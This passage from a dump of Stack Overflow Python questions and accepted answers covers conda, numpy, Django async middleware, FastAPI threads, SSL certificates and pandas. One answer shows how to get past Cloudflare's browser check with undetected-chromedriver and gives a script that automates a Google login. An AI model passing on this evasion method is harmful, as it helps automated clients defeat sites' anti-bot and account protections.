    "Title": "VSCode pytest discovery not working: conda error?",
    "Body": "I'm having a strange problem with VSCode's python testing functionality. When I try to discover tests I get the following error:\n> conda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear .\ncwd: .\n[ERROR 2022-1-3 21:49:47.851]: Error discovering pytest tests:\n [r [Error]: \nEnvironmentLocationNotFound: Not a conda environment: /Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox\n\nBut obviously there's a duplication error: /Users/david.hoffman/miniconda3/envs/sandbox/envs/sandbox.\nIf I run this command directly in the terminal I get the expected output and no errors:\nconda run -n sandbox --no-capture-output python ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/get_output_via_markers.py ~/.vscode/extensions/ms-python.python-2022.0.1786462952/pythonFiles/testing_tools/run_adapter.py discover pytest -- --rootdir . -s --cache-clear\n\nI'm completely stumped as there doesn't seem to be any settings that would affect this.\nI tried reinstalling VSCode from scratch (after removing all the local files) same with conda.\n",
    "AcceptedAnswerId": 70982213,
    "AcceptedAnswer": "Two ways I've found to fix:\n\nChange the name of the conda environment. Just cloning sandbox to boxsand did the trick\nAdd python.condaPath variable to VSCode's preferences\n\n"
}
{
    "Id": 70750396,
    "PostTypeId": 1,
    "Title": "How to generate a Rank 5 matrix with entries Uniform?",
    "Body": "I want to generate a rank 5 100x600 matrix in numpy with all the entries sampled from np.random.uniform(0, 20), so that all the entries will be uniformly distributed between [0, 20). What will be the best way to do so in python?\nI see there is an SVD-inspired way to do so here (https://math.stackexchange.com/questions/3567510/how-to-generate-a-rank-r-matrix-with-entries-uniform), but I am not sure how to code it up. I am looking for a working example of this SVD-inspired way to get uniformly distributed entries.\nI have actually managed to code up a rank 5 100x100 matrix by vertically stacking five 20x100 rank 1 matrices, then shuffling the vertical indices. However, the resulting 100x100 matrix does not have uniformly distributed entries [0, 20).\nHere is my code (my best attempt):\nimport numpy as np\ndef randomMatrix(m, n, p, q):\n    # creates an m x n matrix with lower bound p and upper bound q, randomly.\n    count = np.random.uniform(p, q, size=(m, n))\n    return count\n\nQs = []\nmy_rank = 5\nfor i in range(my_rank):\n  L = randomMatrix(20, 1, 0, np.sqrt(20))\n  # L is tall\n  R = randomMatrix(1, 100, 0, np.sqrt(20)) \n  # R is long\n  Q = np.outer(L, R)\n  Qs.append(Q)\n\nQ = np.vstack(Qs)\n#shuffle (preserves rank 5 [confirmed])\nnp.random.shuffle(Q)\n\n\n",
    "AcceptedAnswerId": 70964065,
    "AcceptedAnswer": "I just couldn't take the fact the my previous solution (the \"selection\" method) did not really produce strictly uniformly distributed entries, but only close enough to fool a statistical test sometimes. The asymptotical case however, will almost surely not be distributed uniformly. But I did dream up another crazy idea that's just as bad, but in another manner - it's not really random.\nIn this solution, I do smth similar to OP's method of forming R matrices with rank 1 and then concatenating them but a little differently. I create each matrix by stacking a base vector on top of itself multiplied by 0.5 and then I stack those on the same base vector shifted by half the dynamic range of the uniform distribution. This process continues with multiplication by a third, two thirds and 1 and then shifting and so on until i have the number of required vectors in that part of the matrix.\nI know it sounds incomprehensible. But, unfortunately, I couldn't find a way to explain it better. Hopefully, reading the code would shed some more light.\nI hope this \"staircase\" method will be more reliable and useful.\nimport numpy as np \nfrom matplotlib import pyplot as plt\n\n'''\nparams:\n    N    - base dimention\n    M    - matrix length\n    R    - matrix rank\n    high - max value of matrix\n    low  - min value of the matrix\n'''\nN    = 100\nM    = 600\nR    = 5\nhigh = 20\nlow  = 0\n\n# base vectors of the matrix\nbase = low+np.random.rand(R-1, N)*(high-low)\n\ndef build_staircase(base, num_stairs, low, high):\n    '''\n    create a uniformly distributed matrix with rank 2 'num_stairs' different \n    vectors whose elements are all uniformly distributed like the values of \n    'base'.\n    '''\n    l = levels(num_stairs)\n    vectors = []\n    for l_i in l:\n        for i in range(l_i):\n            vector_dynamic = (base-low)/l_i\n            vector_bias    = low+np.ones_like(base)*i*((high-low)/l_i)\n            vectors.append(vector_dynamic+vector_bias)\n    return np.array(vectors)\n\n\ndef levels(total):\n    '''\n    create a sequence of stritcly increasing numbers summing up to the total.\n    '''\n    l = []\n    sum_l = 0\n    i = 1\n    while sum_l < total:\n        l.append(i)\n        i +=1\n        sum_l = sum(l)\n    i = 0\n    while sum_l > total:\n        l[i] -= 1\n        if l[i] == 0:\n            l.pop(i)\n        else:\n            i += 1\n        if i == len(l):\n            i = 0\n        sum_l = sum(l)\n    return l\n        \nn_rm = R-1 # number of matrix subsections\nm_rm = M//n_rm\nlen_rms = [ M//n_rm for i in range(n_rm)]\nlen_rms[-1] += M%n_rm\nrm_list = []\nfor len_rm in len_rms:\n    # create a matrix with uniform entries with rank 2\n    # out of the vector 'base[i]' and a ones vector.\n    rm_list.append(build_staircase(\n        base = base[i], \n        num_stairs = len_rms[i], \n        low = low,\n        high = high,\n    ))\n\nrm = np.concatenate(rm_list)\nplt.hist(rm.flatten(), bins = 100)\n\nA few examples:\n\n\n\nand now with N = 1000, M = 6000 to empirically demonstrate the nearly asymptotic behavior:\n\n\n\n"
}
{
    "Id": 70863543,
    "PostTypeId": 1,
    "Title": "Can a Python docstring be calculated (f-string or %-expression)?",
    "Body": "Is it possible to have a Python docstring calculated? I have a lot of repetitive things in my docstrings, so I'd like to either use f-strings or a %-style format expression.\nWhen I use an f-string at the place of a docstring\n\nimporting the module invokes the processing\nbut when I check the __doc__ of such a function it is empty\nsphinx barfs when the docstring is an f-string\n\nI do know how to process the docstrings after the import, but that doesn't work for object 'doc' strings which is recognized by sphinx but is not a real __doc__'s of the object.\n",
    "AcceptedAnswerId": 70865657,
    "AcceptedAnswer": "Docstrings in Python must be regular string literals.\nThis is pretty easy to test - the following program does not show the docstring:\nBAR = \"Hello world!\"\n\ndef foo():\n        f\"\"\"This is {BAR}\"\"\"\n        pass\n\nassert foo.__doc__ is None\nhelp(foo)\n\n\nThe Python syntax docs say that the docstring must be a \"string literal\", and the tail end of the f-string reference says they \"cannot be used as docstrings\".\nSo unfortunately you must use the __doc__ attribute.\nHowever, you should be able to use a decorator to read the __doc__ attribute and replace it with whatever you want.\n"
}
{
    "Id": 70987896,
    "PostTypeId": 1,
    "Title": "Why is this task faster in Python than Julia?",
    "Body": "I ran the following code in RStudio:\nexo <- read.csv('exoplanets.csv',TRUE,\",\")\ndf <- data.frame(exo)\n\nranks <- 570\nfiles <- 3198\ndatas <- vector()\n\nfor ( w in 2:files ) {\n    listas <-vector()\n    for ( i in 1:ranks) {\n            name <- as.character(df[i,w])\n            listas <- append (listas, name)\n    }\n    datas <- append (datas, listas)\n}\n\nIt reads a huge NASA CSV file, converts it to a dataframe,\nconverts each element to string, and adds them to a vector.\nRStudio took 4 min and 15 seconds.\nSo I decided to implement the same code in Julia.\nI ran the following in VS Code:\nusing CSV, DataFrames\n\ndf = CSV.read(\"exoplanets.csv\", DataFrame)\n\nfil, col = 570, 3198\narr = []\n\nfor i in 2:fil\n        for j in 1:col\n            push!(arr, string(df[i, j]))\n        end\nend\n\nThe result was good.\nThe Julia code took only 1 minute and 25 seconds!\nThen for pure curiosity I implemented the same code\nthis time in Python to compare.\nI ran the following in VS Code:\nimport numpy as np\nimport pandas as pd\n\nexo = pd.read_csv(\"exoplanets.csv\")\narr = np.array(exo)\n\nfil, col = 570, 3198\nlis = []\n\nfor i in range(1, fil):\n        for j in range(col):\n            lis.append(arr[i][j].astype('str'))\n\nThe result shocked me! Only 35 seconds!!!\nAnd in Spyder from Anaconda only 26 seconds!!!\nAlmost 2 million floats!!!\nIs Julia slower than Python in data analysis?\nCan I improve the Julia code?\n",
    "AcceptedAnswerId": 70988453,
    "AcceptedAnswer": "NOTE: I wrote the below assuming you want the other column order (as in the Python and R examples).  It is more efficient in Julia this way; to make it work equivalently to your original behaviour, permute the logic or your data at the right places (left as an exercise). Bogumi\u0142's anwer does the right thing already.\n\nPut stuff into functions, preallocate where possible, iterate in stride order, use views, and use builtin functions and broadcasting:\nfunction tostringvector(d)\n    r, c = size(d)\n    result = Vector{String}(undef, r*c)\n    v = reshape(result, r, c)\n    for (rcol, dcol) in zip(eachcol(v), eachcol(d))\n        @inbounds rcol .= string.(dcol)\n    end\n    return result\nend\n\nWhich certainly can be optimized harder.\nOr shorter, making use of what DataFrames already provides:\ntostringvector(d) = vec(Matrix(string.(d)))\n\n"
}
{
    "Id": 70977935,
    "PostTypeId": 1,
    "Title": "Why do I receive 'unable to get local issuer certificate (_ssl.c:997)'",
    "Body": "When sending a request to a specific URL I get an SSL error and I am not sure why. First please see the error message I am presented with:\nrequests.exceptions.SSLError: HTTPSConnectionPool(host='dicmedia.korean.go.kr', port=443): Max retries exceeded with url: /multimedia/naver/2016/40000/35000/14470_byeon-gyeong.wav (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:997)')))\n\nI searched unsuccessfully to different Stackoverflow questions for the last two days:\nI already tried:\n\nhttps://github.com/Unbabel/COMET/issues/29 (This seems to be related with an internal update Python received relating to the use of specific SSL certificates (not an expert here)\nDownloading the certificate in question and directly linking to it with verify=\"private/etc/ssl/certs\"\n\nI am honestly at loss why I receive this error. As the error message itself indicates it seems that the server in question could get my local certificates somehow. The script worked until a week before. I did not update Python before then. Right now I use python 3.10.2 downloaded from the official website.\nI don't want to set verify=False as this just skips the verification process and leaves me vulnerable as numerous people already pointed out at different questions. Besides that it really bothers me that I can't resolve the error.\nAny help is much appreciated. See the specific request:\nimport requests\n\ndef request(url):\n    response = requests.get(url, verify=\"/private/etc/ssl/certs\")\n    print(response)\n\nrequest(\"https://dicmedia.korean.go.kr/multimedia/naver/2016/40000/35000/14470_byeon- \ngyeong.wav\")\n\n",
    "AcceptedAnswerId": 70997594,
    "AcceptedAnswer": "After a lot of googling I figured out the solution myself:\nThe problem - so it seems - was not all certificates needed where included in Pythons cacert.pem file. As I indicated in my question above to tackle this I downloaded the certifi module at first. As this didn't work out as well I suppose certifi missed the necessary certificates as well.\nBut I suppose not all certificates in the certificate where missing. As answers to similar questions indicated as well mostly what is missing is not the entire chain, but only the intermediate certificates.\nAfter:\n1. downloading the necessary certificates (see the lock symbol in your browser; if you're on OSX you need to drag and drop the big images of the certificates to your finder or desktop etc.),\n2. converting them to .perm files and bundling them together: cat first_cert.pem second_cert.pem > combined_cert.pem \nand\n3. providing the specific path of the bundled certificates as indicated in my question: verify=\"private/etc/ssl/certs (you may of course choose a different file path).\nmy request got accepted by the server.\nI guess my mistake when trying this solution was that I didn't download the entire chain at first, but only the last certificate.\nI really hope this helps someone else as a point of reference.\nWhat I am still dying to know though, is why the error popped up in the first place. I didn't change my script at all and use it on a regular basis, but suddenly got presented with said error. Was the reason that the server I tried to reach change its certificates?\nApologies if my terminology is incorrect.\n"
}
{
    "Id": 71518406,
    "PostTypeId": 1,
    "Title": "How to bypass cloudflare browser checking selenium Python",
    "Body": "I am trying to access a site using selenium Python.\nBut the site is checking and checking continuously by cloudflare.\nNo other page is coming.\nCheck the screenshot here.\n\nI have tried undetected chrome but it is not working at all.\n",
    "AcceptedAnswerId": 71518481,
    "AcceptedAnswer": "By undetected chrome do you mean undetected chromedriver?:\nAnyways, undetected-chromedriver works for me:\nUndetected chromedriver\nGithub: https://github.com/ultrafunkamsterdam/undetected-chromedriver\npip install undetected-chromedriver\n\nCode that gets a cloudflare protected site:\nimport undetected_chromedriver as uc\ndriver = uc.Chrome(use_subprocess=True)\ndriver.get('https://nowsecure.nl')\n\nMy POV\n\n\n\nQuick setup code that logs into your google account:\nGithub: https://github.com/xtekky/google-login-bypass\nimport undetected_chromedriver as uc\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\n#  ---------- EDIT ----------\nemail = 'email\\n' # replace email\npassword = 'password\\n' # replace password\n#  ---------- EDIT ----------\n\ndriver = uc.Chrome(use_subprocess=True)\nwait = WebDriverWait(driver, 20)\nurl = 'https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button'\ndriver.get(url)\n\n\nwait.until(EC.visibility_of_element_located((By.NAME, 'identifier'))).send_keys(email)\nwait.until(EC.visibility_of_element_located((By.NAME, 'password'))).send_keys(password)\nprint(\"You're in!! enjoy\")\n\n# [ ---------- paste your code here ---------- ]\n\n"
}
{
    "Id": 71010343,
    "PostTypeId": 1,
    "Title": "Cannot load `swrast` and `iris` drivers in Fedora 35",
    "Body": "Essentially, trying to write the following code results in the error below:\nCode\nfrom matplotlib import pyplot as plt\nplt.plot([1,2,3,2,1])\nplt.show()\n\nError\nlibGL error: MESA-LOADER: failed to open iris: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/iris_dri.so) (search paths /usr/lib64/dri, suffix _dri)\nlibGL error: failed to load driver: iris\nlibGL error: MESA-LOADER: failed to open swrast: /home/xxx/.conda/envs/stat/lib/python3.8/site-packages/pandas/_libs/window/../../../../../libstdc++.so.6: version `GLIBCXX_3.4.29' not found (required by /usr/lib64/dri/swrast_dri.so) (search paths /usr/lib64/dri, suffix _dri)\nlibGL error: failed to load driver: swrast\n\nI found similar errors on StackOverflow but none were what is needed here.\n",
    "AcceptedAnswerId": 71010344,
    "AcceptedAnswer": "Short answer: export LD_PRELOAD=/usr/lib64/libstdc++.so.6\nLong answer:\nThe underlying problem is that we have a piece of software that was built with an older C++ compiler. Part of the compiler is its implementation of libstdc++ which becomes part of the runtime requirements for anything built by the compiler. The software in question has, evidently, brought its own, older implementation of libstdc++ along for the ride, and given its libstdc++ precedence over the system's libstdc++. Typically, this is done via the $LD_LIBRARY_PATH environment variable. Unfortunately, /usr/lib64/dri/swrast_dri.so is a piece of system software built by the native compiler for that system, and it's more recent than the compiler that built the other software in question. The result of this is that the older compiler's libstdc++ gets loaded first, with its older, more limited symbol set. When it then wants to load swrast, this fails because swrast insists on having the level of compiler/runtime with which it was built. The solution to this whole mess is the force the system's (newer) libstdc++ into use and prevent the older libstdc++ from being brought into play. This is achieved via the code snippet export LD_PRELOAD=/usr/lib64/libstdc++.so.6 where we set the preload environment variable.\n"
}
{
    "Id": 70872276,
    "PostTypeId": 1,
    "Title": "FastAPI python: How to run a thread in the background?",
    "Body": "I'm making a server in python using FastAPI, and I want a function that is not related to my API, to run in background every 5 minutes (like checking stuff from an API and printing stuff depending on the response)\nI've tried to make a thread that runs the function start_worker, but it doesn't print anything.\nDoes anyone know how to do so ?\ndef start_worker():\n    print('[main]: starting worker...')\n    my_worker = worker.Worker()\n    my_worker.working_loop() # this function prints \"hello\" every 5 seconds\n\nif __name__ == '__main__':\n    print('[main]: starting...')\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000, reload=True)\n    _worker_thread = Thread(target=start_worker, daemon=False)\n    _worker_thread.start()\n\n",
    "AcceptedAnswerId": 70873984,
    "AcceptedAnswer": "You should start your Thread before calling uvicorn.run, as uvicorn.run is blocking the thread.\nPS: In your question you state that you would like the background task to run every 5 minutes, but in your code you say every 5 seconds. The below examples assume that is the latter you want. If you want it to be executed every 5 minutes instead, then adjust the time to 60 * 5.\nOption 1\nimport time\nimport threading\nfrom fastapi import FastAPI\nimport uvicorn\n\napp = FastAPI()\nclass BackgroundTasks(threading.Thread):\n    def run(self,*args,**kwargs):\n        while True:\n            print('Hello')\n            time.sleep(5)\n  \nif __name__ == '__main__':\n    t = BackgroundTasks()\n    t.start()\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n\nYou could also start your thread using FastAPI's startup event, as long as it is ok to run before the application starts.\n@app.on_event(\"startup\")\nasync def startup_event():\n    t = BackgroundTasks()\n    t.start()\n\nOption 2\nYou could instead use a repeating Event scheduler for the background task, as below:\nimport sched, time\nfrom threading import Thread\nfrom fastapi import FastAPI\nimport uvicorn\n\napp = FastAPI()\ns = sched.scheduler(time.time, time.sleep)\n\ndef print_event(sc): \n    print(\"Hello\")\n    sc.enter(5, 1, print_event, (sc,))\n\ndef start_scheduler():\n    s.enter(5, 1, print_event, (s,))\n    s.run()\n\n@app.on_event(\"startup\")\nasync def startup_event():\n    thread = Thread(target = start_scheduler)\n    thread.start()\n\nif __name__ == '__main__':\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n\n"
}
{
    "Id": 70864474,
    "PostTypeId": 1,
    "Title": "Uvicorn async workers are still working synchronously",
    "Body": "Question in short\nI have migrated my project from Django 2.2 to Django 3.2, and now I want to start using the possibility for asynchronous views. I have created an async view, setup asgi configuration, and run gunicorn with a Uvicorn worker. When swarming this server with 10 users concurrently, they are served synchronously. What do I need to configure in order to serve 10 concurrent users an async view?\nQuestion in detail\nThis is what I did so far in my local environment:\n\nI am working with Django 3.2.10 and Python 3.9.\nI have installed gunicorn and uvicorn through pip\nI have created an asgi.py file with the following contents\n\n    import os\n    from django.core.asgi import get_asgi_application\n    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'MyService.settings.local')\n    application = get_asgi_application()\n\n\nI have created a view with the following implementation, and connected it in urlpatterns:\n\n    import asyncio\n    import json\n    from django.http import HttpResponse\n    \n    async def async_sleep(request):\n        await asyncio.sleep(1)\n        return HttpResponse(json.dumps({'mode': 'async', 'time': 1).encode())\n\n\nI run locally a gunicorn server with a Uvicorn worker:\n\ngunicorn MyService.asgi:application -k uvicorn.workers.UvicornWorker\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Starting gunicorn 20.1.0\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Listening at: http://127.0.0.1:8000 (8732)\n[2022-01-26 14:37:14 +0100] [8732] [INFO] Using worker: uvicorn.workers.UvicornWorker\n[2022-01-26 14:37:14 +0100] [8733] [INFO] Booting worker with pid: 8733\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Started server process [8733]\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Waiting for application startup.\n[2022-01-26 13:37:15 +0000] [8733] [INFO] ASGI 'lifespan' protocol appears unsupported.\n[2022-01-26 13:37:15 +0000] [8733] [INFO] Application startup complete.\n\n\nI hit the API from a local client once. After 1 second, I get a 200 OK, as expected.\nI set up a locust server to spawn concurrent users. When I let it make requests with 1 concurrent user, every 1 second an API call is completed.\nWhen I let it make requests with 10 concurrent users, every 1 second an API call is completed. All other requests are waiting.\n\nThis last thing is not what I expect. I expect the worker, while sleeping asynchronously, to pick up the next request already. Am I missing some configuration?\nI also tried it by using Daphne instead of Uvicorn, but with the same result.\nLocust\nThis is how I have set up my locust.\n\nStart a new virtualenv\npip install locust\nCreate a locustfile.py with the following content:\n\nfrom locust import HttpUser, task\nclass SleepUser(HttpUser):\n    @task\n    def async_sleep(self):\n        self.client.get('/api/async_sleep/')\n\n\nRun the locust executable from the shell\nVisit http://0.0.0.0:8089 in the browser\nSet number of workers to 10, spawn rate to 1 and host to http://127.0.0.1:8000\n\nMiddleware\nThese are my middleware settings\nMIDDLEWARE = [\n    'django_prometheus.middleware.PrometheusBeforeMiddleware',\n    'corsheaders.middleware.CorsMiddleware',\n    'django.middleware.gzip.GZipMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n    'django.middleware.security.SecurityMiddleware',\n    'shared.common.middleware.ApiLoggerMiddleware',\n    'django_prometheus.middleware.PrometheusAfterMiddleware',\n]\n\nThe ApiLoggerMiddleware from shared is from our own code, I will investigate this one first. This is the implementation of it.\nimport logging\nimport os\nfrom typing import List\n\nfrom django.http import HttpRequest, HttpResponse\nfrom django.utils import timezone\n\nfrom shared.common.authentication_service import BaseAuthenticationService\n\n\nclass ApiLoggerMiddleware:\n    TOO_BIG_FOR_LOG_BYTES = 2 * 1024\n\n    def __init__(self, get_response):\n        # The get_response callable is provided by Django, it is a function\n        # that takes a request and returns a response. Plainly put, once we're\n        # done with the incoming request, we need to pass it along to get the\n        # response which we need to ultimately return.\n        self._get_response = get_response\n        self.logger = logging.getLogger('api')\n        self.pid = os.getpid()\n        self.request_time = None\n        self.response_time = None\n\n    def __call__(self, request: HttpRequest) -> HttpResponse:\n        common_data = self.on_request(request)\n        response = self._get_response(request)\n        self.on_response(response, common_data)\n        return response\n\n    def truncate_body(self, request: HttpRequest) -> str:\n        return f\"{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}\"\n\n    def on_request(self, request: HttpRequest) -> List[str]:\n        self.request_time = timezone.now()\n\n        remote_address = self.get_remote_address(request)\n        user_agent = request.headers.get('User-Agent') or ''\n        customer_uuid = self.get_customer_from_request_auth(request)\n        method = request.method\n        uri = request.get_raw_uri()\n\n        common = [\n            remote_address,\n            user_agent,\n            customer_uuid,\n            method,\n            uri\n        ]\n\n        in_line = [\n                      \"IN\",\n                      str(self.pid),\n                      str(self.request_time),\n                  ] + common + [\n                      self.truncate_body(request)\n                  ]\n\n        self.logger.info(', '.join(in_line))\n        return common\n\n    def on_response(self, response: HttpResponse, common: List[str]) -> None:\n        self.response_time = timezone.now()\n\n        out_line = [\n                       \"OUT\",\n                       str(self.pid),\n                       str(self.response_time)\n                   ] + common + [\n                       str(self.response_time - self.request_time),\n                       str(response.status_code),\n                   ]\n        self.logger.info(\", \".join(out_line))\n\n    @classmethod\n    def get_customer_from_request_auth(cls, request: HttpRequest) -> str:\n        token = request.headers.get('Authorization')\n        if not token:\n            return 'no token'\n        try:\n            payload = BaseAuthenticationService.validate_access_token(token)\n            return payload.get('amsOrganizationId', '')\n        except Exception:\n            return 'unknown'\n\n    @classmethod\n    def get_remote_address(cls, request: HttpRequest) -> str:\n        if 'X-Forwarded-For' in request.headers:\n            # in case the request comes in through a proxy, the remote address\n            # will be just the last proxy that passed it along, that's why we\n            # have to get the remote from X-Forwarded-For\n            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\n            addresses = request.headers['X-Forwarded-For'].split(',')\n            client = addresses[0]\n            return client\n        else:\n            return request.META.get('REMOTE_ADDR', '')\n\nSources\nSources I have used:\n\nA Guide to ASGI in Django 3.0 and its performance\nHow to use Django with Uvicorn\n\n",
    "AcceptedAnswerId": 71023739,
    "AcceptedAnswer": "Your ApiLoggerMiddleware is a synchronous middleware.\nFrom https://docs.djangoproject.com/en/4.0/topics/async/#async-views, emphasis mine:\n\nYou will only get the benefits of a fully-asynchronous request stack if you have no synchronous middleware loaded into your site. If there is a piece of synchronous middleware, then Django must use a thread per request to safely emulate a synchronous environment for it.\nMiddleware can be built to support both sync and async contexts. Some of Django\u2019s middleware is built like this, but not all. To see what middleware Django has to adapt, you can turn on debug logging for the django.request logger and look for log messages about \u201cSynchronous middleware \u2026 adapted\u201d.\n\n(The log message currently says \"Asynchronous middleware ... adapted\", bug reported at #33495.)\nTurn on debug logging for the django.request logger  by adding this to your LOGGING setting:\n'django.request': {\n    'handlers': ['console'],\n    'level': 'DEBUG',\n},\n\nSolution\nTo make ApiLoggerMiddleware asynchronous:\n\nInherit django.utils.deprecation.MiddlewareMixin.\n\ncall super().__init__(get_response) in __init__.\nremove __call__; MiddlewareMixin.__call__ makes your middleware asynchronous.\n\n\nRefactor on_request to process_request.\n\nreturn None instead of common.\nattach common to request instead: request.common = common.\nremember to update references to request.common.\nattach request_time to request instead of self to make it (and the middleware) thread-safe.\nremember to update references to request.request_time.\n\n\nRefactor on_response(self, response, common) to process_response(self, request, response).\n\nreturn response.\ndon't attach response_time to self; leave it as a variable since it's not used in other functions.\n\n\n\nThe result:\nclass ApiLoggerMiddleware(MiddlewareMixin):\n    TOO_BIG_FOR_LOG_BYTES = 2 * 1024\n\n    def __init__(self, get_response):\n        # The get_response callable is provided by Django, it is a function\n        # that takes a request and returns a response. Plainly put, once we're\n        # done with the incoming request, we need to pass it along to get the\n        # response which we need to ultimately return.\n        super().__init__(get_response)  # +\n        self._get_response = get_response\n        self.logger = logging.getLogger('api')\n        self.pid = os.getpid()\n        # self.request_time = None   # -\n        # self.response_time = None  # -\n\n    # def __call__(self, request: HttpRequest) -> HttpResponse:  # -\n    #     common_data = self.on_request(request)                 # -\n    #     response = self._get_response(request)                 # -\n    #     self.on_response(response, common_data)                # -\n    #     return response                                        # -\n\n    def truncate_body(self, request: HttpRequest) -> str:\n        return f\"{request.body[:self.TOO_BIG_FOR_LOG_BYTES]}\"\n\n    # def on_request(self, request: HttpRequest) -> List[str]:  # -\n    def process_request(self, request: HttpRequest) -> None:    # +\n        # self.request_time = timezone.now()   # -\n        request.request_time = timezone.now()  # +\n\n        remote_address = self.get_remote_address(request)\n        user_agent = request.headers.get('User-Agent') or ''\n        customer_uuid = self.get_customer_from_request_auth(request)\n        method = request.method\n        uri = request.get_raw_uri()\n\n        common = [\n            remote_address,\n            user_agent,\n            customer_uuid,\n            method,\n            uri\n        ]\n\n        in_line = [\n            \"IN\",\n            str(self.pid),\n            # str(self.request_time),   # -\n            str(request.request_time),  # +\n        ] + common + [\n            self.truncate_body(request)\n        ]\n\n        self.logger.info(', '.join(in_line))\n        # return common          # -\n        request.common = common  # +\n        return None              # +\n\n    # def on_response(self, response: HttpResponse, common: List[str]) -> None:                # -\n    def process_response(self, request: HttpRequest, response: HttpResponse) -> HttpResponse:  # +\n        # self.response_time = timezone.now()  # -\n        response_time = timezone.now()         # +\n\n        out_line = [\n            \"OUT\",\n            str(self.pid),\n            # str(self.response_time)  # -\n            str(response_time)         # +\n            # ] + common + [                    # -\n        ] + getattr(request, 'common', []) + [  # +\n            # str(self.response_time - self.request_time),             # -\n            str(response_time - getattr(request, 'request_time', 0)),  # +\n            str(response.status_code),\n        ]\n        self.logger.info(\", \".join(out_line))\n        return response  # +\n\n    @classmethod\n    def get_customer_from_request_auth(cls, request: HttpRequest) -> str:\n        token = request.headers.get('Authorization')\n        if not token:\n            return 'no token'\n        try:\n            payload = BaseAuthenticationService.validate_access_token(token)\n            return payload.get('amsOrganizationId', '')\n        except Exception:\n            return 'unknown'\n\n    @classmethod\n    def get_remote_address(cls, request: HttpRequest) -> str:\n        if 'X-Forwarded-For' in request.headers:\n            # in case the request comes in through a proxy, the remote address\n            # will be just the last proxy that passed it along, that's why we\n            # have to get the remote from X-Forwarded-For\n            # https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For\n            addresses = request.headers['X-Forwarded-For'].split(',')\n            client = addresses[0]\n            return client\n        else:\n            return request.META.get('REMOTE_ADDR', '')\n\n"
}
{
    "Id": 70935209,
    "PostTypeId": 1,
    "Title": "how to explode dynamically using pandas column?",
    "Body": "I have a dataframe that looks like this\nimport pandas as pd\nimport numpy as np\n# Create data set.\ndataSet = {'id': ['A', 'A', 'B'],\n           'id_2': [1, 2, 1] ,\n           'number': [320, 169, 120],\n           'add_number' : [4,6,3]}\n\n# Create dataframe with data set and named columns.\ndf = pd.DataFrame(dataSet, columns= ['id', 'id_2','number', 'add_number'])\n\n    id  id_2    number  add_number\n0   A   1        320       4\n1   A   2        169       6\n2   B   1        120       3\n\nI would like use number and add_number so that I can explode this dynamically, ie) 320 + 4 would have [320,321,322,323,324] (up to 324, and would like to explode on this)\nDESIRED OUTPUT\n    id  id_2    number\n0   A   1        320       \n1   A   1        321       \n2   A   1        322\n3   A   1        323\n4   A   1        324\n5   A   2        169\n6   A   2        170\n7   A   2        171\n8   A   2        172\n9   A   2        173\n10  A   2        174\n11  A   2        175\n12  B   1        120\n13  B   1        121\n14  B   1        122\n15  B   1        123\n\nI looked over explode, wide_to_long pandas function, but I do not know where to start, any sense of direction would be appreciated!!\n",
    "AcceptedAnswerId": 70935300,
    "AcceptedAnswer": "You try using np.arange and explode:\ndf['range'] = df.apply(lambda x: np.arange(x['number'], x['number']+x['add_number']+1), axis=1)\ndf.explode('range')\n\nor\ndf['range'] = [np.arange(n, n+a+1) for n, a in zip(df['number'],df['add_number'])] \ndf.explode('range')\n\nOutput:\n  id  id_2  number  add_number range\n0  A     1     320           4   320\n0  A     1     320           4   321\n0  A     1     320           4   322\n0  A     1     320           4   323\n0  A     1     320           4   324\n1  A     2     169           6   169\n1  A     2     169           6   170\n1  A     2     169           6   171\n1  A     2     169           6   172\n1  A     2     169           6   173\n1  A     2     169           6   174\n1  A     2     169           6   175\n2  B     1     120           3   120\n2  B     1     120           3   121\n2  B     1     120           3   122\n2  B     1     120           3   123\n\n"
}
{
    "Id": 70966298,
    "PostTypeId": 1,
    "Title": "Python Black code formatter doesn't format docstring line length",
    "Body": "I am running the Black code formatter against a Python script however it doesn't reformat the line length for docstrings. For example, given the following code:\ndef my_func():\n    \"\"\"\n    This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring. This is a really long docstring.\n    \"\"\"\n    return\n\nWhen running Black against this script, the line length does not change. How can I ensure docstrings get formatted when running Black?\n",
    "AcceptedAnswerId": 71041192,
